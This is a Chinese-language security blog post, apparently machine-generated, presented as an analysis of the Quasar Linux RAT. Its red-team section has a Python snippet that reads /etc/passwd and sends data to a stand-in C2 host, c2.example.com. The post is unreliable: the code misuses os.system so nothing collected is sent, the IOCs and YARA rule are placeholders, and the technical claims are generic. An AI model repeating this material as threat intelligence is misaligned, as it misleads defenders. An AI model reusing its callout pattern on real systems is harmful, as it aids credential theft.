---
layout: post
title:  "Quasar Linux RAT Steals Developer Credentials for Software Supply Chain Compromise"
date:   2026-05-08 13:15:46 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Quasar Linux RAT：一種針對開發者的高級惡意軟件
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 LPE (Local Privilege Escalation)
> * **關鍵技術**: eBPF, Rootkit, PAM Inline-Hook Backdoor

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Quasar Linux RAT 利用 Linux 系統的漏洞，例如未經檢查的用戶輸入和不當的權限管理，來實現其惡意功能。
* **攻擊流程圖解**:
  1. 攻擊者將惡意軟件上傳到開發者的系統。
  2. 惡意軟件執行並建立與 C2 伺服器的連接。
  3. 惡意軟件收集系統資訊和用戶憑證。
  4. 惡意軟件實現 RCE 和 LPE。
* **受影響元件**: Linux 系統，特別是那些具有高權限的開發者系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有系統的管理權限和網路存取權。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import socket
    
    # 建立 C2 伺服器連接
    c2_server = 'c2.example.com'
    c2_port = 8080
    
    # 收集系統資訊和用戶憑證
    system_info = os.system('uname -a')
    user_credentials = os.system('cat /etc/passwd')
    
    # 實現 RCE 和 LPE
    rce_payload = 'bash -c "echo \'Hello, World!\'"'
    lpe_payload = 'sudo -u root bash -c "echo \'Hello, World!\'"'
    
    # 發送 payload 到 C2 伺服器
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((c2_server, c2_port))
    sock.sendall(rce_payload.encode())
    sock.sendall(lpe_payload.encode())
    sock.close()
    
    ```
* **繞過技術**: Quasar Linux RAT 使用 eBPF 和 Rootkit 技術來繞過系統的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | c2.example.com | /tmp/malware |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Quasar_Linux_RAT {
      meta:
        description = "Quasar Linux RAT Malware"
        author = "Your Name"
      strings:
        $a = "c2.example.com"
        $b = "/tmp/malware"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 更新系統和應用程式，實施強密碼和多因素驗證，限制系統的管理權限和網路存取權。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **eBPF (Extended Berkeley Packet Filter)**: 一種 Linux 系統的網路封包過濾技術，允許用戶定義自訂的網路封包處理邏輯。
* **Rootkit**: 一種惡意軟件，旨在隱藏系統的惡意活動和資料。
* **PAM Inline-Hook Backdoor**: 一種惡意軟件，利用 PAM (Pluggable Authentication Module) 來實現用戶憑證的竊取和惡意活動的隱藏。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/quasar-linux-rat-steals-developer.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


